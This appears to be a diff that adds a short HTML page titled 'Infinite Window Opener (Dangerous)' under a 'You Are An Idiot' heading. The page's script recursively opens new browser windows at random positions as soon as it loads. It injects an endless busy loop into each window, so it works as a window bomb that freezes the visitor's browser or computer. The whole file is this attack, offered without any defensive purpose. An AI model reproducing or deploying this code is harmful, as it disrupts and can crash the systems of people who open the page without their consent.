@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Infinite Window Opener (Dangerous)</title>
+  </head>
+  <body>
+    <script>
+      function getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+      }
+      // reference: getRandomInt(min, max);
+      function openWindow() {
+        const features = `width=170,height=190,left=${getRandomInt(0,1366)},top=${getRandomInt(0,768)},resizable=no`;
+        const myWindow = window.open("", "_blank", features);
+        myWindow.document.write(
+          `<html><body><script>setTimeout(function crash(){ while(true){ console.log("message"); } }, 1000);<\/script></body></html>`
+        );
+        if (myWindow) {
+            openWindow();
+        } else {
+            alert("Please allow windows");
+        }
+      }
+      openWindow();
+    </script>
+    <h1>You Are An Idiot</h1>
+  </body>
+</html>
